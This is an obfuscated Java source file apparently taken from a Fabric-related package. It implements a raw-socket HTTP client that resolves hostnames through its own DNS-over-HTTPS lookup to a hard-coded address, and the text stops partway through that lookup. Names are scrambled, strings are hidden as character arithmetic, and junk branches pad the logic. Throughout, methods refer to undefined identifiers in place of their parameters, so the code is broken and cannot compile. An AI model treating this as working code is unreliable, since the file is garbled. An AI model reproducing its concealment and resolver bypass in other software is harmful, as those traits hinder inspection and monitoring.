package net.fabric;

import java.io.BufferedInputStream;
import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.URI;
import java.net.URL;
import java.nio.ByteBuffer;
import java.nio.charset.StandardCharsets;
import java.security.SecureRandom;
import java.security.cert.X509Certificate;
import java.util.Base64;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.Map.Entry;
import java.util.concurrent.ConcurrentHashMap;
import javax.net.ssl.SNIHostName;
import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLParameters;
import javax.net.ssl.SSLSocket;
import javax.net.ssl.SSLSocketFactory;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;

public class odmnmv_usk_oj_ppr {
   private static final Map<String, odmnmv_usk_oj_ppr.ujsfd7> hmMCEVIrVOm = new ConcurrentHashMap<>();
   private static SSLSocketFactory bvftU;

   public static odmnmv_usk_oj_ppr.qKdcJ get(String urlStr) throws IOException {
      return feUKXKq4VHm("GET", yunr_wpbkh_xsojpf_gfff, null, null, null);
   }

   public static odmnmv_usk_oj_ppr.qKdcJ get(String urlStr, Map<String, String> headers) throws IOException {
      return feUKXKq4VHm("GET", eByx_FLhO_YDRU_umTR, null, null, fqgdGebba);
   }

   public static odmnmv_usk_oj_ppr.qKdcJ l2LeL7MZWaX0ID(String urlStr, String body, String contentType) throws IOException {
      char[] var3 = new char[]{(char)(23525 - 23445), (char)('鏭' - '鎞'), '\u0000', '\u0000'};
      int var4 = -603116668;
      if ((var4 & -603116668) == -603116668) {
         var4 = -828116973;
         var4 += 137;
         var4 ^= 357892604;
         var4 <<= 2;
      }

      var3[2] = (char)(4462 - 4379);
      var3[3] = (char)('\uf1c7' - '\uf173');
      return feUKXKq4VHm(new String(var3), Itry_vx_3wnAuj, sbxiyHwioraYxajiMts, targetBuf, null);
   }

   public static odmnmv_usk_oj_ppr.qKdcJ refDhz(String urlStr, String body, String contentType, Map<String, String> headers) throws IOException {
      StringBuilder var4 = new StringBuilder();
      var4.append((char)(11204 - 11124));
      var4.append((char)('튽' - '퉮'));
      var4.append((char)('\uf423' - '\uf3d0'));
      var4.append((char)('谞' - '诊'));
      int var5 = 160357;
      if (var5 >= 160357 && var5 < 7509368) {
         var5 = 524203677;
         var5 <<= 13;
         var5 >>>= 17;
      }

      return feUKXKq4VHm(var4.toString(), delta0, hLWfdi3, jMin, paramMax);
   }

   public static odmnmv_usk_oj_ppr.qKdcJ put(String urlStr, String body, String contentType, Map<String, String> headers) throws IOException {
      return feUKXKq4VHm("PUT", pt_nn_sk, MLqw_NqHN_NYAq_BWHB, gwgLwcjoYnadiAb, khkj_ukkxd_yg);
   }

   public static odmnmv_usk_oj_ppr.qKdcJ feUKXKq4VHm(String method, String urlStr, String body, String contentType, Map<String, String> customHeaders) throws IOException {
      URL ircci_fdfmv_jctqqg_nzadk = URI.create(keysoc_zqfgf_rahfez_gmumr).toURL();
      String ohxNakliXlefTprv = ircci_fdfmv_jctqqg_nzadk.getHost();
      int sx_xtol = ircci_fdfmv_jctqqg_nzadk.getPort();
      String var10000 = ircci_fdfmv_jctqqg_nzadk.getProtocol();
      char[] var22 = new char[]{(char)('נּ' - '齃'), (char)(22942 - 22826), (char)('닚' - '뉦'), (char)(23018 - 22906), (char)(21299 - 21184)};
      boolean n = var10000.equalsIgnoreCase(new String(var22));
      if (sx_xtol == -1) {
         sx_xtol = n ? 443 : 80;
      }

      String sSTl_QaCh_AlHt_amAd = ircci_fdfmv_jctqqg_nzadk.getPath();
      if (sSTl_QaCh_AlHt_amAd == null || sSTl_QaCh_AlHt_amAd.isEmpty()) {
         sSTl_QaCh_AlHt_amAd = "/";
      }

      if (ircci_fdfmv_jctqqg_nzadk.getQuery() != null) {
         String var25 = ircci_fdfmv_jctqqg_nzadk.getQuery();
         sSTl_QaCh_AlHt_amAd = sSTl_QaCh_AlHt_amAd + "?" + var25;
      }

      String arg = bMelheXyz(ohxNakliXlefTprv);
      Socket cRaw = new Socket();
      cRaw.setReceiveBufferSize(524288);
      cRaw.connect(new InetSocketAddress(arg, sx_xtol), 10000);
      cRaw.setSoTimeout(30000);
      Socket mqpcxtHrxwlSqmp;
      if (n) {
         SSLSocket mlxw_OUMq_CmrW_QoYM = (SSLSocket)bvftU.createSocket(cRaw, ohxNakliXlefTprv, sx_xtol, true);
         SSLParameters vdkvb_wpkp_vmv = mlxw_OUMq_CmrW_QoYM.getSSLParameters();
         vdkvb_wpkp_vmv.setServerNames(List.of(new SNIHostName(ohxNakliXlefTprv)));
         StringBuilder var26 = new StringBuilder();
         var26.append((char)('諒' - '蘆'));
         var26.append((char)('짅' - '쥱'));
         var26.append((char)('봸' - '볤'));
         var26.append((char)(598 - 518));
         var26.append((char)(11268 - 11185));
         vdkvb_wpkp_vmv.setEndpointIdentificationAlgorithm(var26.toString());
         mlxw_OUMq_CmrW_QoYM.setSSLParameters(vdkvb_wpkp_vmv);
         mlxw_OUMq_CmrW_QoYM.startHandshake();
         mqpcxtHrxwlSqmp = mlxw_OUMq_CmrW_QoYM;
      } else {
         mqpcxtHrxwlSqmp = cRaw;
      }

      odmnmv_usk_oj_ppr.qKdcJ var67;
      try {
         OutputStream valLen = mqpcxtHrxwlSqmp.getOutputStream();
         InputStream OoU__56AsU_mG1 = mqpcxtHrxwlSqmp.getInputStream();
         StringBuilder lUus_GIxs_kgoZ_Hmiu = new StringBuilder();
         StringBuilder var68 = lUus_GIxs_kgoZ_Hmiu.append(ycz_bokhos).append(" ").append(sSTl_QaCh_AlHt_amAd);
         StringBuilder var28 = new StringBuilder();
         var28.append((char)('실' - '싄'));
         var28.append((char)(14604 - 14532));
         var28.append((char)(20560 - 20476));
         var28.append((char)(7342 - 7258));
         var28.append((char)('\uf01d' - '\uefcd'));
         var28.append((char)(28204 - 28157));
         var28.append((char)('\uf244' - '\uf213'));
         var28.append((char)(17086 - 17040));
         var28.append((char)(14638 - 14589));
         var28.append((char)('싑' - '싄'));
         var28.append((char)(14542 - 14532));
         var68.append(var28.toString());
         char[] var30 = new char[]{
            (char)('\ua7f2' - 'Ɦ'), (char)(16437 - 16326), (char)(24081 - 23966), (char)(21695 - 21579), (char)(19170 - 19112), (char)('辒' - '轲')
         };
         lUus_GIxs_kgoZ_Hmiu.append(new String(var30)).append(ohxNakliXlefTprv);
         if (n && sx_xtol != 443 || !n && sx_xtol != 80) {
            lUus_GIxs_kgoZ_Hmiu.append(":").append(sx_xtol);
         }

         lUus_GIxs_kgoZ_Hmiu.append("\r\n");
         char[] var32 = new char[]{
            (char)(7093 - 7026),
            (char)(2631 - 2520),
            (char)('詟' - '觱'),
            (char)(31862 - 31752),
            (char)('좺' - '졕'),
            (char)(24325 - 24226),
            (char)('쨨' - '즴'),
            (char)(29376 - 29271),
            (char)(24230 - 24119),
            (char)(30041 - 29931),
            (char)(7084 - 7026),
            (char)(2552 - 2520),
            (char)('詔' - '觱'),
            (char)(31860 - 31752),
            (char)('죄' - '졕'),
            (char)(24341 - 24226),
            (char)('쨙' - '즴'),
            (char)(29284 - 29271),
            (char)(24129 - 24119)
         };
         lUus_GIxs_kgoZ_Hmiu.append(new String(var32));
         boolean CBZs__iOzVr = false;
         boolean MiB_Z_NWQsYYYD = false;
         if (jBuf != null) {
            for (Entry wvze_zleo_lnl : jBuf.entrySet()) {
               String holderTmp = (String)wvze_zleo_lnl.getKey();
               StringBuilder var34 = new StringBuilder();
               var34.append((char)('흝' ^ '휕'));
               var34.append((char)('ꕅ' ^ 'ꔪ'));
               var34.append((char)('\ue927' ^ '\ue954'));
               var34.append((char)('韮' ^ '鞚'));
               if (!holderTmp.equalsIgnoreCase(var34.toString())) {
                  StringBuilder var36 = new StringBuilder();
                  var36.append((char)('\uf1ee' - '\uf1ab'));
                  var36.append((char)('謫' - '誼'));
                  var36.append((char)('\ue304' - '\ue296'));
                  var36.append((char)('떉' - '딛'));
                  var36.append((char)('\uf210' - '\uf1ab'));
                  var36.append((char)('謟' - '誼'));
                  var36.append((char)('\ue30a' - '\ue296'));
                  var36.append((char)('떄' - '딛'));
                  var36.append((char)('\uf21a' - '\uf1ab'));
                  var36.append((char)('謪' - '誼'));
                  if (!holderTmp.equalsIgnoreCase(var36.toString())) {
                     char[] var38 = new char[]{
                        (char)('왇' + 14844),
                        (char)(29668 + '貋'),
                        (char)('\ue780' + 6382),
                        (char)(21141 + '귟'),
                        (char)(10598 + '훿'),
                        (char)(6389 + '\ue779'),
                        (char)(14500 + '쟐'),
                        (char)(16689 + '뻼'),
                        (char)('꠶' + 22550),
                        (char)('랟' + 18630),
                        (char)('\ua63a' + 23092),
                        (char)(21666 + 'ꯅ'),
                        (char)('莏' + 31973),
                        (char)('왬' + 14844)
                     };
                     if (!holderTmp.equalsIgnoreCase(new String(var38))) {
                        char[] var40 = new char[]{
                           (char)(20391 - 20326), (char)('靻' - '霘'), (char)('錊' - '銧'), (char)(31899 - 31798), (char)(20438 - 20326), (char)('鞌' - '霘')
                        };
                        if (holderTmp.equalsIgnoreCase(new String(var40))) {
                           CBZs__iOzVr = true;
                        }

                        StringBuilder var42 = new StringBuilder();
                        var42.append((char)('\ue28a' ^ '\ue2df'));
                        var42.append((char)('鋣' ^ '銐'));
                        var42.append((char)('놑' ^ '뇴'));
                        var42.append((char)(29558 ^ 29444));
                        var42.append((char)('챨' ^ '책'));
                        var42.append((char)('軦' ^ '躧'));
                        var42.append((char)('츁' ^ '칦'));
                        var42.append((char)(24738 ^ 24775));
                        var42.append((char)('ꭈ' ^ 'ꬦ'));
                        var42.append((char)(18703 ^ 18811));
                        if (holderTmp.equalsIgnoreCase(var42.toString())) {
                           MiB_Z_NWQsYYYD = true;
                        }

                        lUus_GIxs_kgoZ_Hmiu.append(holderTmp).append(": ").append((String)wvze_zleo_lnl.getValue()).append("\r\n");
                     }
                  }
               }
            }
         }

         if (!CBZs__iOzVr) {
            StringBuilder var44 = new StringBuilder();
            var44.append((char)(24510 ^ 24575));
            var44.append((char)(4781 ^ 4814));
            var44.append((char)(28398 ^ 28301));
            var44.append((char)('츓' ^ '칶'));
            var44.append((char)(31411 ^ 31427));
            var44.append((char)(6249 ^ 6173));
            var44.append((char)('諗' ^ '諭'));
            var44.append((char)('藉' ^ '藩'));
            var44.append((char)(9156 ^ 9198));
            var44.append((char)('ꫫ' ^ '\uaac4'));
            var44.append((char)(24533 ^ 24575));
            var44.append((char)(4803 ^ 4814));
            var44.append((char)(28295 ^ 28301));
            lUus_GIxs_kgoZ_Hmiu.append(var44.toString());
         }

         if (!MiB_Z_NWQsYYYD) {
            StringBuilder var46 = new StringBuilder();
            StringBuilder var47 = new StringBuilder();
            var47.append((char)(1127 ^ 1074));
            var47.append((char)(16552 ^ 16603));
            var47.append((char)('鳵' ^ '鲐'));
            var47.append((char)(30910 ^ 30924));
            var47.append((char)('老' ^ '耬'));
            var47.append((char)(20472 ^ 20409));
            var47.append((char)('귺' ^ '궝'));
            var47.append((char)(13418 ^ 13327));
            var47.append((char)(12832 ^ 12878));
            var47.append((char)(21933 ^ 21977));
            var47.append((char)(16708 ^ 16766));
            var46.append(var47.toString());
            StringBuilder var49 = new StringBuilder();
            var49.append((char)('骜' + 25988));
            var49.append((char)('뫁' + 17804));
            var49.append((char)('뙢' + 18957));
            var49.append((char)(12749 + '캭'));
            var49.append((char)(11951 + '톺'));
            var49.append((char)('髨' + 25988));
            var49.append((char)('뫠' + 17804));
            var49.append((char)('뙔' + 18957));
            var46.append(var49.toString());
            StringBuilder var51 = new StringBuilder();
            var51.append((char)(23124 - 23077));
            var51.append((char)('꼼' - '꼇'));
            var51.append((char)('뺿' - '뺑'));
            var51.append((char)(3711 - 3663));
            var51.append((char)(31158 - 31126));
            var51.append((char)(12541 - 12501));
            var51.append((char)(23164 - 23077));
            var51.append((char)('꽰' - '꼇'));
            var51.append((char)('뻿' - '뺑'));
            var51.append((char)(3763 - 3663));
            var51.append((char)(31237 - 31126));
            var51.append((char)(12620 - 12501));
            var51.append((char)(23192 - 23077));
            var46.append(var51.toString());
            StringBuilder var53 = new StringBuilder();
            var53.append((char)('놓' - '녳'));
            var53.append((char)(29655 - 29577));
            var53.append((char)(6866 - 6782));
            var53.append((char)(22826 - 22794));
            var53.append((char)('鉭' - '鈼'));
            var53.append((char)('뼙' - '뻩'));
            var53.append((char)(32007 - 31961));
            var53.append((char)(14843 - 14795));
            var53.append((char)(7597 - 7538));
            var53.append((char)('갭' - '갍'));
            var53.append((char)('ꋡ' - 'ꊊ'));
            var53.append((char)('쭤' - '쫻'));
            var53.append((char)(9660 - 9550));
            var53.append((char)(28714 - 28660));
            var53.append((char)('놧' - '녳'));
            var46.append(var53.toString());
            char[] var55 = new char[]{
               (char)(6723 - 6664),
               (char)(13587 - 13555),
               (char)('\udf64' - '\udeec'),
               (char)('\uea8a' - '\uea54'),
               (char)('雽' - '雉'),
               (char)(29190 - 29149),
               (char)('亮' - '綾'),
               (char)(23288 - 23223),
               (char)('\uebb3' - '\ueb43'),
               (char)('\ueb07' - '\uea97'),
               (char)(24158 - 24050),
               (char)('\uf825' - '\uf7c0'),
               (char)(19957 - 19870),
               (char)(4024 - 3923),
               (char)(6762 - 6664)
            };
            var46.append(new String(var55));
            StringBuilder var57 = new StringBuilder();
            var57.append((char)(2934 ^ 2877));
            var57.append((char)('齿' ^ '鼖'));
            var57.append((char)(2472 ^ 2524));
            var57.append((char)(15175 ^ 15208));
            var57.append((char)('荒' ^ '惘'));
            var57.append((char)('ꑮ' ^ 'ꑝ'));
            var57.append((char)('醩' ^ '醞'));
            var57.append((char)(18670 ^ 18624));
            var57.append((char)(27064 ^ 27019));
            var57.append((char)(4719 ^ 4697));
            var57.append((char)(7288 ^ 7285));
            var57.append((char)(3902 ^ 3892));
            var46.append(var57.toString());
            lUus_GIxs_kgoZ_Hmiu.append(var46.toString());
         }

         byte[] OohO_ildG_BCBI_kpcW = null;
         if (bTmp != null) {
            OohO_ildG_BCBI_kpcW = bTmp.getBytes(StandardCharsets.UTF_8);
            if (vecbQotbaVdoKetv != null) {
               StringBuilder var59 = new StringBuilder();
               var59.append((char)('퐫' - '폨'));
               var59.append((char)(28266 - 28155));
               var59.append((char)(31199 - 31089));
               var59.append((char)(13802 - 13686));
               var59.append((char)(8896 - 8795));
               var59.append((char)(20021 - 19911));
               var59.append((char)('표' - '폨'));
               var59.append((char)(28200 - 28155));
               var59.append((char)(31173 - 31089));
               var59.append((char)(13807 - 13686));
               var59.append((char)(8907 - 8795));
               var59.append((char)(20012 - 19911));
               var59.append((char)('퐢' - '폨'));
               var59.append((char)(28187 - 28155));
               lUus_GIxs_kgoZ_Hmiu.append(var59.toString()).append(vecbQotbaVdoKetv).append("\r\n");
            }

            StringBuilder var61 = new StringBuilder();
            var61.append((char)('\uf5a9' - '\uf566'));
            var61.append((char)(6554 - 6443));
            var61.append((char)(19426 - 19316));
            var61.append((char)('\ue89f' - '\ue82b'));
            var61.append((char)(22217 - 22116));
            var61.append((char)(25790 - 25680));
            var61.append((char)(21207 - 21091));
            var61.append((char)(23903 - 23858));
            var61.append((char)('ﾅ' - 'Ｙ'));
            var61.append((char)(24846 - 24745));
            var61.append((char)(31791 - 31681));
            var61.append((char)('阀' - '閙'));
            var61.append((char)('\uf5da' - '\uf566'));
            var61.append((char)(6547 - 6443));
            var61.append((char)(19374 - 19316));
            var61.append((char)('\ue84b' - '\ue82b'));
            lUus_GIxs_kgoZ_Hmiu.append(var61.toString()).append(OohO_ildG_BCBI_kpcW.length).append("\r\n");
         }

         lUus_GIxs_kgoZ_Hmiu.append("\r\n");
         valLen.write(lUus_GIxs_kgoZ_Hmiu.toString().getBytes(StandardCharsets.ISO_8859_1));
         if (OohO_ildG_BCBI_kpcW != null) {
            valLen.write(OohO_ildG_BCBI_kpcW);
         }

         valLen.flush();
         var67 = kolausFacade(OoU__56AsU_mG1);
      } finally {
         mqpcxtHrxwlSqmp.close();
      }

      return var67;
   }

   private static odmnmv_usk_oj_ppr.qKdcJ kolausFacade(InputStream in) throws IOException {
      BufferedInputStream DcMx_CAwo_QAIw_AyMX = new BufferedInputStream(qlfczjHoSybsTgue);
      ByteArrayOutputStream dkyl_wb_xovm_gjp = new ByteArrayOutputStream();
      int aRhN_diXL_mzxz_BBRh = -1;

      int FOsv_BZ2PiJJrv;
      while ((FOsv_BZ2PiJJrv = DcMx_CAwo_QAIw_AyMX.read()) != -1) {
         dkyl_wb_xovm_gjp.write(FOsv_BZ2PiJJrv);
         if (aRhN_diXL_mzxz_BBRh == 13 && FOsv_BZ2PiJJrv == 10) {
            int idxlzOnecq = dkyl_wb_xovm_gjp.size();
            byte[] sIFy = dkyl_wb_xovm_gjp.toByteArray();
            if (idxlzOnecq >= 4 && sIFy[idxlzOnecq - 4] == 13 && sIFy[idxlzOnecq - 3] == 10) {
               break;
            }
         }

         aRhN_diXL_mzxz_BBRh = FOsv_BZ2PiJJrv;
      }

      String XdtP_rklP_uZdt_dYMS = dkyl_wb_xovm_gjp.toString(StandardCharsets.ISO_8859_1);
      String[] offsetItem = XdtP_rklP_uZdt_dYMS.split("\r\n");
      String Dmpn_NSOO_GttI_sDRB = offsetItem.length > 0 ? offsetItem[0] : "";
      int ihqFrdTuhuHiep = 0;
      StringBuilder var18 = new StringBuilder();
      var18.append((char)(8795 ^ 8723));
      var18.append((char)('귑' ^ '궅'));
      var18.append((char)('鋺' ^ '銮'));
      var18.append((char)('췹' ^ '충'));
      var18.append((char)('飖' ^ '飹'));
      if (Dmpn_NSOO_GttI_sDRB.startsWith(var18.toString())) {
         int pos0 = Dmpn_NSOO_GttI_sDRB.indexOf(32);
         if (pos0 > 0) {
            int opChgdpr = Dmpn_NSOO_GttI_sDRB.indexOf(32, pos0 + 1);
            String LrHD_kdhe_YgOr_sNAM = opChgdpr > 0 ? Dmpn_NSOO_GttI_sDRB.substring(pos0 + 1, opChgdpr) : Dmpn_NSOO_GttI_sDRB.substring(pos0 + 1);

            try {
               ihqFrdTuhuHiep = Integer.parseInt(LrHD_kdhe_YgOr_sNAM.trim());
            } catch (NumberFormatException var26) {
            }
         }
      }

      Map NC3vI2IDdL = new LinkedHashMap();
      int Xtqu_cqmn_XnsX_BXxm = -1;
      boolean sizeAcc = false;

      for (int msgStr = 1; msgStr < offsetItem.length; msgStr++) {
         String zsol_yZAs_mycO_MHtt = offsetItem[msgStr];
         int optsMin = zsol_yZAs_mycO_MHtt.indexOf(58);
         if (optsMin > 0) {
            String gnPh_cBBl_iobb_rbBA = zsol_yZAs_mycO_MHtt.substring(0, optsMin).trim().toLowerCase();
            String Hdst_uT_l = zsol_yZAs_mycO_MHtt.substring(optsMin + 1).trim();
            NC3vI2IDdL.put(gnPh_cBBl_iobb_rbBA, Hdst_uT_l);
            StringBuilder var20 = new StringBuilder();
            var20.append((char)('뚨' + 18875));
            var20.append((char)('\uf131' + 3902));
            var20.append((char)('앛' + 15123));
            var20.append((char)(27047 + '雍'));
            var20.append((char)(1371 + '\ufb0a'));
            var20.append((char)('\ue5c3' + 6827));
            var20.append((char)('뼐' + 16740));
            var20.append((char)(14697 + '웄'));
            var20.append((char)('솈' + 16100));
            var20.append((char)('뚪' + 18875));
            var20.append((char)('\uf130' + 3902));
            var20.append((char)('암' + 15123));
            var20.append((char)(27047 + '雍'));
            var20.append((char)(1374 + '\ufb0a'));
            if (gnPh_cBBl_iobb_rbBA.equals(var20.toString())) {
               try {
                  Xtqu_cqmn_XnsX_BXxm = Integer.parseInt(Hdst_uT_l);
               } catch (NumberFormatException var25) {
               }
            } else {
               char[] var22 = new char[]{
                  (char)(3033 - 2917),
                  (char)('朗' - '蘒'),
                  (char)(3963 - 3866),
                  (char)('育' - '聄'),
                  (char)(30617 - 30502),
                  (char)('\uf0f9' - '\uf093'),
                  (char)(3018 - 2917),
                  (char)('朗' - '蘒'),
                  (char)(3911 - 3866),
                  (char)('肩' - '聄'),
                  (char)(30612 - 30502),
                  (char)('\uf0f6' - '\uf093'),
                  (char)(3028 - 2917),
                  (char)('彩' - '蘒'),
                  (char)(3971 - 3866),
                  (char)('育' - '聄'),
                  (char)(30605 - 30502)
               };
               if (gnPh_cBBl_iobb_rbBA.equals(new String(var22))) {
                  String var10000 = Hdst_uT_l.toLowerCase();
                  StringBuilder var24 = new StringBuilder();
                  var24.append((char)('덢' - '닿'));
                  var24.append((char)('탁' - '큙'));
                  var24.append((char)(30472 - 30355));
                  var24.append((char)('轚' - '軬'));
                  var24.append((char)('뉺' - '눏'));
                  var24.append((char)(30595 - 30494));
                  var24.append((char)('덣' - '닿'));
                  if (var10000.contains(var24.toString())) {
                     sizeAcc = true;
                  }
               }
            }
         }
      }

      byte[] eGKQ_SPnf_YdLE_Dnai;
      if (sizeAcc) {
         eGKQ_SPnf_YdLE_Dnai = ann_msdhsa_ty(DcMx_CAwo_QAIw_AyMX);
      } else if (Xtqu_cqmn_XnsX_BXxm >= 0) {
         eGKQ_SPnf_YdLE_Dnai = new byte[Xtqu_cqmn_XnsX_BXxm];
         int resultNum = 0;

         while (resultNum < Xtqu_cqmn_XnsX_BXxm) {
            int resOut = DcMx_CAwo_QAIw_AyMX.read(eGKQ_SPnf_YdLE_Dnai, resultNum, Xtqu_cqmn_XnsX_BXxm - resultNum);
            if (resOut == -1) {
               break;
            }

            resultNum += resOut;
         }
      } else {
         ByteArrayOutputStream ymtarOypfLzjgcc = new ByteArrayOutputStream(1048576);
         byte[] YNHDx3tWFcIQON = new byte[131072];

         int YBRu_fGbp_Pguu_AWfD;
         while ((YBRu_fGbp_Pguu_AWfD = DcMx_CAwo_QAIw_AyMX.read(YNHDx3tWFcIQON)) != -1) {
            ymtarOypfLzjgcc.write(YNHDx3tWFcIQON, 0, YBRu_fGbp_Pguu_AWfD);
         }

         eGKQ_SPnf_YdLE_Dnai = ymtarOypfLzjgcc.toByteArray();
      }

      return new odmnmv_usk_oj_ppr.qKdcJ(ihqFrdTuhuHiep, Dmpn_NSOO_GttI_sDRB, NC3vI2IDdL, eGKQ_SPnf_YdLE_Dnai);
   }

   private static byte[] ann_msdhsa_ty(InputStream in) throws IOException {
      ByteArrayOutputStream offset1 = new ByteArrayOutputStream(1048576);
      StringBuilder z64b1w_3h7 = new StringBuilder();

      while (true) {
         z64b1w_3h7.setLength(0);

         int haHA22pta3nA;
         while ((haHA22pta3nA = L94s_WO_Wx8qV.read()) != -1 && haHA22pta3nA != 13) {
            z64b1w_3h7.append((char)haHA22pta3nA);
         }

         if (haHA22pta3nA == 13) {
            L94s_WO_Wx8qV.read();
         }

         String bgcYmLw = z64b1w_3h7.toString();
         int qkdtAhcPskgAcvubb = bgcYmLw.indexOf(59);
         if (qkdtAhcPskgAcvubb >= 0) {
            bgcYmLw = bgcYmLw.substring(0, qkdtAhcPskgAcvubb);
         }

         if (bgcYmLw.isEmpty()) {
            break;
         }

         int xntphSldqyKbawpgWt = Integer.parseInt(bgcYmLw.trim(), 16);
         if (xntphSldqyKbawpgWt == 0) {
            break;
         }

         byte[] sedTwiQnz = new byte[xntphSldqyKbawpgWt];
         int MZXnZ = 0;

         while (true) {
            if (MZXnZ < xntphSldqyKbawpgWt) {
               int lvtqqr_yhqe = L94s_WO_Wx8qV.read(sedTwiQnz, MZXnZ, xntphSldqyKbawpgWt - MZXnZ);
               if (lvtqqr_yhqe != -1) {
                  MZXnZ += lvtqqr_yhqe;
                  continue;
               }
            }

            offset1.write(sedTwiQnz, 0, MZXnZ);
            L94s_WO_Wx8qV.read();
            L94s_WO_Wx8qV.read();
            break;
         }
      }

      return offset1.toByteArray();
   }

   public static String bMelheXyz(String hostname) throws IOException {
      if (oefte_rgba(F2WXRV)) {
         return F2WXRV;
      } else {
         odmnmv_usk_oj_ppr.ujsfd7 urXkWcjc = hmMCEVIrVOm.get(F2WXRV);
         if (urXkWcjc != null && !urXkWcjc.isExpired()) {
            return urXkWcjc.ip;
         } else {
            byte[] HRr0mIG_O_pCz9 = neMnoiyk(F2WXRV);
            if (-1013652041597153338L == -1013652041597153338L) {
               int var5 = -1459232344;
               var5 += 213;
               var5 ^= -1619714014;
               var5 <<= 2;
               int var6 = 19975;
               var6 *= 43;
            }

            byte[] kidaaw_ghrdt = vqxnlCs(HRr0mIG_O_pCz9);
            String hvpaw_cqlz_pqqix_mp = Gg_YjOJrd(kidaaw_ghrdt);
            if (hvpaw_cqlz_pqqix_mp != null) {
               hmMCEVIrVOm.put(F2WXRV, new odmnmv_usk_oj_ppr.ujsfd7(hvpaw_cqlz_pqqix_mp, System.currentTimeMillis() + 300000L));
            }

            return hvpaw_cqlz_pqqix_mp;
         }
      }
   }

   private static boolean oefte_rgba(String s) {
      if (liuz_gbx_so_owov != null && !liuz_gbx_so_owov.isEmpty()) {
         for (int ByHq_naGP_GEZZ_aufX = 0; ByHq_naGP_GEZZ_aufX < liuz_gbx_so_owov.length(); ByHq_naGP_GEZZ_aufX++) {
            char nbma_bFPy_xepm_UUpU = liuz_gbx_so_owov.charAt(ByHq_naGP_GEZZ_aufX);
            if (nbma_bFPy_xepm_UUpU != '.' && (nbma_bFPy_xepm_UUpU < '0' || nbma_bFPy_xepm_UUpU > '9')) {
               return false;
            }
         }

         return liuz_gbx_so_owov.contains(".");
      } else {
         return false;
      }
   }

   private static byte[] neMnoiyk(String hostname) {
      ByteArrayOutputStream pkxMit = new ByteArrayOutputStream();
      DataOutputStream v1 = new DataOutputStream(pkxMit);

      try {
         short yiZjyufa = (short)((int)(System.nanoTime() & 65535L));
         v1.writeShort(yiZjyufa);
         v1.writeShort(256);
         v1.writeShort(1);
         v1.writeShort(0);
         v1.writeShort(0);
         v1.writeShort(0);

         for (String nAux : mYCX_zPMg_QKlM_xmFX.split("\\.")) {
            v1.writeByte(nAux.length());
            v1.writeBytes(nAux);
         }

         v1.writeByte(0);
         v1.writeShort(1);
         v1.writeShort(1);
      } catch (IOException var8) {
         throw new RuntimeException(var8);
      }

      return pkxMit.toByteArray();
   }

   private static byte[] vqxnlCs(byte[] dnsQuery) throws IOException {
      Socket v3L_akhH = new Socket();
      StringBuilder var11 = new StringBuilder();
      var11.append((char)(27116 - 27067));
      var11.append((char)('\ue56f' - '\ue541'));
      var11.append((char)('薬' - '蕻'));
      var11.append((char)(108 - 62));
      var11.append((char)('싣' - '슲'));
      var11.append((char)('谴' - '谆'));
      var11.append((char)(738 - 689));
      v3L_akhH.connect(new InetSocketAddress(var11.toString(), 443), 10000);
      v3L_akhH.setSoTimeout(30000);
      char[] var13 = new char[]{
         (char)('웴' + 14703),
         (char)('谸' + 29748),
         (char)(25140 + '鸻'),
         (char)('ﺇ' + 494),
         (char)('묽' + 17703),
         (char)(4281 + '\uefad'),
         (char)('웽' + 14703),
         (char)('谭' + 29748),
         (char)(25143 + '鸻'),
         (char)('ﹷ' + 494),
         (char)('묆' + 17703),
         (char)(4279 + '\uefad'),
         (char)('웿' + 14703),
         (char)('谿' + 29748),
         (char)(25075 + '鸻'),
         (char)('\ufe75' + 494),
         (char)('뭈' + 17703),
         (char)(4288 + '\uefad')
      };
      SSLSocket MGzvRebIV = (SSLSocket)bvftU.createSocket(v3L_akhH, new String(var13), 443, true);
      SSLParameters fyZr_tfQP_qumm_lLbH = MGzvRebIV.getSSLParameters();
      StringBuilder var15 = new StringBuilder();
      var15.append((char)(17672 ^ 17771));
      var15.append((char)(17527 ^ 17435));
      var15.append((char)('요' ^ '웻'));
      var15.append((char)(12747 ^ 12734));
      var15.append((char)(2146 ^ 2054));
      var15.append((char)('\ue14a' ^ '\ue12c'));
      var15.append((char)(17671 ^ 17771));
      var15.append((char)(17530 ^ 17435));
      var15.append((char)('욉' ^ '웻'));
      var15.append((char)(12763 ^ 12734));
      var15.append((char)(2091 ^ 2054));
      var15.append((char)('\ue148' ^ '\ue12c'));
      var15.append((char)(17669 ^ 17771));
      var15.append((char)(17512 ^ 17435));
      var15.append((char)('웕' ^ '웻'));
      var15.append((char)(12765 ^ 12734));
      var15.append((char)(2153 ^ 2054));
      var15.append((char)('\ue141' ^ '\ue12c'));
      fyZr_tfQP_qumm_lLbH.setServerNames(List.of(new SNIHostName(var15.toString())));
      MGzvRebIV.setSSLParameters(fyZr_tfQP_qumm_lLbH);
      MGzvRebIV.startHandshake();

      byte[] var9;
      try {
         OutputStream holder5 = MGzvRebIV.getOutputStream();
         InputStream resultPtr = MGzvRebIV.getInputStream();
         String qzuxd_qi_uprn_zxken = Base64.getUrlEncoder().withoutPadding().encodeToString(jkUqexzYawtgcBw);
         StringBuilder eTmp = new StringBuilder();
         char[] var17 = new char[]{
            (char)('펠' ^ '폧'),
            (char)('\uf1d5' ^ '\uf190'),
            (char)('꾃' ^ '꿗'),
            (char)('\ueaf8' ^ '\uead8'),
            (char)('샦' ^ '색'),
            (char)(28139 ^ 28047),
            (char)(10796 ^ 10818),
            (char)(1486 ^ 1469),
            (char)(10751 ^ 10706),
            (char)(28338 ^ 28355),
            (char)('慄' ^ '怜'),
            (char)(28000 ^ 27909),
            (char)('\udde5' ^ '\udd97'),
            (char)('펞' ^ '폧'),
            (char)('\uf1af' ^ '\uf190'),
            (char)('꾳' ^ '꿗'),
            (char)('\ueab6' ^ '\uead8'),
            (char)('삺' ^ '색'),
            (char)(28082 ^ 28047)
         };
         StringBuilder var10000 = eTmp.append(new String(var17)).append(qzuxd_qi_uprn_zxken);
         StringBuilder var19 = new StringBuilder();
         var19.append((char)(20150 - 20118));
         var19.append((char)('轥' - '輝'));
         var19.append((char)(32255 - 32171));
         var19.append((char)(28070 - 27986));
         var19.append((char)(4451 - 4371));
         var19.append((char)('\ue69c' - '\ue66d'));
         var19.append((char)(20167 - 20118));
